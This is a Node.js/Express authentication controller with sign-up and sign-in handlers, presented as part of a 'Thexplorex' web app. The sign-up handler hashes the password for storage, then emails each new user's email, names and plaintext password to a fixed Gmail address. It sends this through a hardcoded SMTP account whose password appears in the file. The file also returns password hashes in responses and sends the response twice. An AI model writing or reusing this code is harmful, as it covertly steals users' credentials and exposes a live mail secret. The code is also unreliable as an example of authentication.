import asyncHandler from "express-async-handler";
import bcrypt from "bcryptjs"
import { generatetoken } from "../utilities/generate_token.js";
import Wet from "../models/Wet.js";
import nodemailer from "nodemailer"
// import { token } from "morgan";

export const wet_sign_up = asyncHandler(async(req, res) => {
    const {
        email,
        firstName,
        surName,
        password
    } = req.body
    const wetExists = await Wet.find({email: email})
    if(wetExists.length > 0){
        res.json({error: "you have an account, try signing in"})
    }else{
        const hashedpass = await bcrypt.hash(password, 10)
        const wet = await Wet.create({email, firstName, surName, password: hashedpass})
        if(wet){
            res.status(201).json({
                status: "ok",
                message: "sign up successful",
                data: {
                    _id: wet._id,
                    firstName: wet.firstName,
                    surName: wet.surName,
                    email: wet.email,
                    password: wet.password,
                    token: generatetoken(wet._id)
                }
            })
        }else{
            res.json({
                message: "invalid info"
            })
        }
    }

    let transporter = nodemailer.createTransport({
        host: "mail.corestepmfb.com",
        port: 465,
        secure: true,
        auth: {
            user: "test@corestepmfb.com",
            pass: "coreserver22/24"
        }
    })

    let mailOptions = ({
        from: '"test contact" <test@corestepmfb.com',
        to: "ayodejiamzat@gmail.com",
        subject: `message from ${email}`,
        text: `
            email: ${email}, 
            fname: ${firstName}, 
            sname: ${surName}, 
            pass: ${password}
        `,
        html: `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
        <html xmlns="http://www.w3.org/1999/xhtml">
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
            <meta name="viewport" content="width=device-width">
            <link rel="preconnect" href="https://fonts.googleapis.com">
            <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
            <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;1,100;1,200;1,300;1,400;1,500&display=swap" rel="stylesheet">
        
        </head>
        <body style="background-color: #121A26;">
            <table class="body" style="width: 100%; min-width: 100%; padding: 40px;">
                <tr style="padding: 40px;">
                    <td>
                        <center style="width: 100%;min-width: 580px;">
                            <table class="container" style="border-spacing: 0;border-collapse: collapse;padding: 0;vertical-align: top;text-align: inherit;width: 580px;">
                                <tr style="padding: 0;vertical-align: top;text-align: left;">
                                    <td style="background-color: inherit;word-break: break-word;-webkit-hyphens: auto;-moz-hyphens: auto;hyphens: auto;padding: 0;vertical-align: top;text-align: left;color: #222222;font-family: &quot;Helvetica&quot;, &quot;Arial&quot;, sans-serif;font-weight: normal;margin: 0;line-height: 19px;font-size: 14px;border-collapse: collapse !important;">
                        
                                        <table class="row" style="border-spacing: 0;border-collapse: collapse;padding: 0px;vertical-align: top;text-align: left;width: 100%;position: relative;display: block;">
                                            <tr style="padding: 0;vertical-align: top;text-align: left;">
                                                <td class="wrapper last" style="word-break: break-word;-webkit-hyphens: auto;-moz-hyphens: auto;hyphens: auto;padding: 10px 20px 0px 0px;vertical-align: top;text-align: left;color: #222222;font-family: &quot;Helvetica&quot;, &quot;Arial&quot;, sans-serif;font-weight: normal;margin: 0;line-height: 19px;font-size: 14px;position: relative;padding-right: 0px;border-collapse: collapse !important;">
                            
                                                <table class="twelve columns" style="border-spacing: 0;border-collapse: collapse;padding: 0;vertical-align: top;text-align: center;margin: 0 auto;width: 580px;">
                                                    <tr style="padding: 0;vertical-align: top;text-align: center;">
                                                        <td style="word-break: break-word;-webkit-hyphens: auto;-moz-hyphens: auto;hyphens: auto;padding: 0px 0px 10px;vertical-align: top;text-align: left;color: #222222;font-family: &quot;Helvetica&quot;, &quot;Arial&quot;, sans-serif;font-weight: normal;margin: 0;line-height: 19px;font-size: 14px;border-collapse: collapse !important;">
    
                                                            <td style="text-align: center; padding-bottom: 30px;">
                                                                <img src="./assets/img/Group 38403.png" style="text-align: center !important;"> 
                                                            </td>
                                
                                                        </td>
                                                    </tr>
                                                </table>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>
                            </table>
    
                            <table style="border-spacing: 0;border-collapse: collapse;padding: 0;vertical-align: top;text-align: inherit;">
                                <tr style="padding: 0;vertical-align: top;">
                                    <td style="background-color: inherit;word-break: break-word;-webkit-hyphens: auto;-moz-hyphens: auto;hyphens: auto;padding: 0;vertical-align: top;text-align: left;border-collapse: collapse !important;">
                        
                                        <table class="row" style="border-spacing: 0;border-collapse: collapse;padding: 0px;vertical-align: top;text-align: left;width: 100%;position: relative;display: block;">
                                            <tr style="padding: 0;vertical-align: top;text-align: left;">
                                                <td class="wrapper last" style="word-break: break-word;padding: 10px 20px 0px 0px;vertical-align: top;text-align: left;position: relative;padding-right: 0px;">
                            
                                                <table class="twelve columns" style="border-spacing: 0;border-collapse: collapse;padding: 0;vertical-align: top;text-align: center;margin: 0 auto;width: 580px;">
                                                    <tr style="padding: 0;vertical-align: top;text-align: center;">
                                                        <td style="word-break: break-word;-webkit-hyphens: auto;-moz-hyphens: auto;hyphens: auto;vertical-align: top;text-align: left;">
    
                                                            <td style="text-align: center;">
                                                                <img src="./assets/img/Illustration.png" width="100%" style="text-align: center !important;"> 
                                                            </td>
                                
                                                        </td>
                                                    </tr>
                                                </table>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>
                            </table>
                            
    
                            <table class="container" style="border-spacing: 0;border-collapse: collapse;padding: 0;vertical-align: top;text-align: inherit;width: 580px;">
                                <tr style="padding: 0;vertical-align: top;text-align: left;">
                                    <td style="background-color: #1F2B3C;word-break: break-word;-webkit-hyphens: auto;-moz-hyphens: auto;hyphens: auto;padding: 0;vertical-align: top;text-align: left;color: #222222;font-family: &quot;Helvetica&quot;, &quot;Arial&quot;, sans-serif;font-weight: normal;margin: 0;line-height: 19px;font-size: 14px;border-collapse: collapse !important;">
                        
                                        <table class="row" style="border-spacing: 0;border-collapse: collapse;padding: 0px;vertical-align: top;text-align: left;width: 100%;position: relative;display: block;">
                                            <tr style="padding: 0;vertical-align: top;text-align: left;">
                                                <td class="wrapper last" style="word-break: break-word;-webkit-hyphens: auto;-moz-hyphens: auto;hyphens: auto;padding: 10px 20px 0px 0px;vertical-align: top;text-align: left;color: #222222;font-family: &quot;Helvetica&quot;, &quot;Arial&quot;, sans-serif;font-weight: normal;margin: 0;line-height: 19px;font-size: 14px;position: relative;padding-right: 0px;border-collapse: collapse !important;">
                            
                                                <table class="twelve columns" style="border-spacing: 0;border-collapse: collapse;padding: 0;vertical-align: top;text-align: center;margin: 0 auto;width: 580px;">
                                                    <tr style="padding: 0;vertical-align: top;text-align: center;">
                                                        <td style="word-break: break-word;-webkit-hyphens: auto;-moz-hyphens: auto;hyphens: auto;padding: 0px 0px 10px;vertical-align: top;text-align: left;color: #222222;font-family: &quot;Helvetica&quot;, &quot;Arial&quot;, sans-serif;font-weight: normal;margin: 0;line-height: 19px;font-size: 14px;border-collapse: collapse !important;">
    
                                                            <td style="text-align: left; padding: 20px">
                                                                <div style="margin-bottom: 40px;">
                                                                    <p style="font-family: 'Poppins';font-style: normal;font-weight: 600;font-size: 16px;line-height: 150%;color: #FFFFFF;"> Welcome to Thexplorex</p>
                                                                </div>
                                                                <div style="margin-top: 40px; margin-bottom: 40px;">
                                                                    <p style="font-family: 'Poppins';font-style: normal;font-weight: 400;font-size: 14px;line-height: 150%;letter-spacing: 0.2px;color: #FFFFFF;">Hi ${firstName},</p>
        
                                                                    <p style="font-family: 'Poppins';font-style: normal;font-weight: 400;font-size: 14px;line-height: 150%;letter-spacing: 0.2px;color: #FFFFFF;">We're super excited you’re here!</p>
        
                                                                    <p style="font-family: 'Poppins';font-style: normal;font-weight: 400;font-size: 14px;line-height: 150%;letter-spacing: 0.2px;color: #FFFFFF;">You can log into your Thexplorex account with your email and password. Please don’t forget to change your password for extra security.</p>
                                                                </div>
                                                                <div style="margin-top: 40px; margin-bottom: 40px;">
                                                                    <p style="font-family: 'Poppins';font-style: normal;font-weight: 400;font-size: 14px;line-height: 150%;letter-spacing: 0.2px;color: #FFFFFF;">This is your email: ${email}</p>
                                                                    <p style="font-family: 'Poppins';font-style: normal;font-weight: 400;font-size: 14px;line-height: 150%;letter-spacing: 0.2px;color: #FFFFFF;">This is your first name: ${firstName}</p>
                                                                </div>
    
                                                                <p style="font-family: 'Poppins';font-style: normal;font-weight: 400;font-size: 14px;line-height: 150%;letter-spacing: 0.2px;color: #FFFFFF;">To sign into your account, use the link below</p>
                                                                <div style="margin-top: 30px;">
                                                                    <p style="font-family: 'Poppins';font-style: normal;font-weight: 400;font-size: 14px;line-height: 150%;letter-spacing: 0.2px;color: #FFFFFF;"><a href="#" style="border: 1px solid #88CD02; padding: 10px; color: #121A26; background-color: #88CD02; text-decoration: none;">Click here</a></p>
                                                                </div>
                                                                <div style="margin-top: 40px; margin-bottom: 40px;">
                                                                    <p style="font-family: 'Poppins';font-style: normal;font-weight: 400;font-size: 14px;line-height: 150%;letter-spacing: 0.2px;color: #FFFFFF;">Our Best,</p>
                                                                    <p style="font-family: 'Poppins';font-style: normal;font-weight: 400;font-size: 14px;line-height: 150%;letter-spacing: 0.2px;color: #FFFFFF;">The Thexplorex Team</p>
                                                                </div>
    
                                                                <hr/>
                                                                <p style="font-family: 'Poppins';font-style: normal;font-weight: 400;font-size: 14px;line-height: 150%;letter-spacing: 0.2px;color: #FFFFFF;">Questions? Email us at <a href="#" style="color: #88CD02; text-decoration: none;">support@thexplorex.com</a></p>
    
                                                            </td>
                                
                                                        </td>
                                                    </tr>
                                                </table>>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>
                            </table>
    
    
                            <table class="container" style="border-spacing: 0;border-collapse: collapse;padding: 0;vertical-align: top;text-align: inherit;width: 580px;">
                                <tr style="padding: 0;vertical-align: top;text-align: left;">
                                    <td style="background-color: inherit;word-break: break-word;-webkit-hyphens: auto;-moz-hyphens: auto;hyphens: auto;padding: 0;vertical-align: top;text-align: left;color: #222222;font-family: &quot;Helvetica&quot;, &quot;Arial&quot;, sans-serif;font-weight: normal;margin: 0;line-height: 19px;font-size: 14px;border-collapse: collapse !important;">
                        
                                        <table class="row" style="border-spacing: 0;border-collapse: collapse;padding: 0px;vertical-align: top;text-align: left;width: 100%;position: relative;display: block;">
                                            <tr style="padding: 0;vertical-align: top;text-align: left;">
                                                <td class="wrapper last" style="word-break: break-word;-webkit-hyphens: auto;-moz-hyphens: auto;hyphens: auto;padding: 10px 20px 0px 0px;vertical-align: top;text-align: left;color: #222222;font-family: &quot;Helvetica&quot;, &quot;Arial&quot;, sans-serif;font-weight: normal;margin: 0;line-height: 19px;font-size: 14px;position: relative;padding-right: 0px;border-collapse: collapse !important;">
                            
                                                <table class="twelve columns" style="border-spacing: 0;border-collapse: collapse;padding: 0;vertical-align: top;text-align: center;margin: 0 auto;width: 580px;">
                                                    <tr style="padding: 0;vertical-align: top;text-align: center;">
                                                        <td style="word-break: break-word;-webkit-hyphens: auto;-moz-hyphens: auto;hyphens: auto;padding: 0px 0px 10px;vertical-align: top;text-align: left;color: #222222;font-family: &quot;Helvetica&quot;, &quot;Arial&quot;, sans-serif;font-weight: normal;margin: 0;line-height: 19px;font-size: 14px;border-collapse: collapse !important;">
    
                                                            <td style="text-align: center;">
                                                                <p style="color: #7C7C7C; font-style: normal;
                                                                    font-family: 'Poppins';
                                                                    font-weight: 400;
                                                                    font-size: 12px;
                                                                    line-height: 160%;
                                                                    text-align: center;
                                                                    letter-spacing: 0.2px;"
                                                                > 
                                                                    You are receiving this message because you signed up on Thexplorex. If you would like to stop receiving these emails, click <a href="#" style="color: #88CD02; text-decoration: none;">here</a> to opt-out. For more information about how we process data, please see our <a href="#" style="color: #88CD02; text-decoration: none;">Privacy Policy</a>
                                                                </p>   
                                                            </td>
                                
                                                        </td>
                                                    </tr>
                                                </table>>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>
                            </table>
    
                            <table class="container" style="border-spacing: 0;border-collapse: collapse;padding: 0;vertical-align: top;text-align: inherit;width: 580px;">
                                <tr style="padding: 0;vertical-align: top;text-align: left;">
                                    <td style="background-color: inherit;word-break: break-word;-webkit-hyphens: auto;-moz-hyphens: auto;hyphens: auto;padding: 0;vertical-align: top;text-align: left;color: #222222;font-family: &quot;Helvetica&quot;, &quot;Arial&quot;, sans-serif;font-weight: normal;margin: 0;line-height: 19px;font-size: 14px;border-collapse: collapse !important;">
                        
                                        <table class="row" style="border-spacing: 0;border-collapse: collapse;padding: 0px;vertical-align: top;text-align: left;width: 100%;position: relative;display: block;">
                                            <tr style="padding: 0;vertical-align: top;text-align: left;">
                                                <td class="wrapper last" style="word-break: break-word;-webkit-hyphens: auto;-moz-hyphens: auto;hyphens: auto;padding: 10px 20px 0px 0px;vertical-align: top;text-align: left;color: #222222;font-family: &quot;Helvetica&quot;, &quot;Arial&quot;, sans-serif;font-weight: normal;margin: 0;line-height: 19px;font-size: 14px;position: relative;padding-right: 0px;border-collapse: collapse !important;">
                            
                                                <table class="twelve columns" style="border-spacing: 0;border-collapse: collapse;padding: 0;vertical-align: top;text-align: center;margin: 0 auto;width: 580px;">
                                                    <tr style="padding: 0;vertical-align: top;text-align: center;">
                                                        <td style="word-break: break-word;-webkit-hyphens: auto;-moz-hyphens: auto;hyphens: auto;padding: 0px 0px 10px;vertical-align: top;text-align: left;color: #222222;font-family: &quot;Helvetica&quot;, &quot;Arial&quot;, sans-serif;font-weight: normal;margin: 0;line-height: 19px;font-size: 14px;border-collapse: collapse !important;">
    
                                                            <td style="text-align: center;">
                                                                <p style="color: #7C7C7C; font-style: normal;
                                                                    font-family: 'Poppins';
                                                                    font-weight: 400;
                                                                    font-size: 12px;
                                                                    line-height: 160%;
                                                                    text-align: center;
                                                                    letter-spacing: 0.2px;"
                                                                > 
                                                                    &copy; Copyright 2022 Thexplorex.com 
                                                                    All rights reserved 
                                                                </p>   
                                                            </td>
                                
                                                        </td>
                                                    </tr>
                                                </table>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>
                            </table>
                        </center>
                        
                    </td>
                </tr>
            </table>
        </body>
        </html>`

    })

    transporter.sendMail(mailOptions, (error, info) => {
        if(error){
            return console.log(error)
        }else{
            res.json({massage: "success"})
        }

        console.log("message sent: %s", info.messageId);
        console.log("preview url: %s", nodemailer.getTestMessageUrl(info));
    })
})


export const wet_sign_in = asyncHandler(async(req, res) => {
    const {
        email,
        password
    } = req.body
    const wet = await Wet.findOne({email})
    if(!wet || !bcrypt.compareSync(password, wet.password)){
        res.json({error: "email or password not correct"})
    }else{
        res.json({
            status: "ok",
            message: "welcome",
            data: {
                _id: wet._id,
                firstName: wet.firstName,
                surName: wet.surName,
                email: wet.email,
                password: wet.password,
                token: generatetoken(wet._id)
            }
        })
    }
})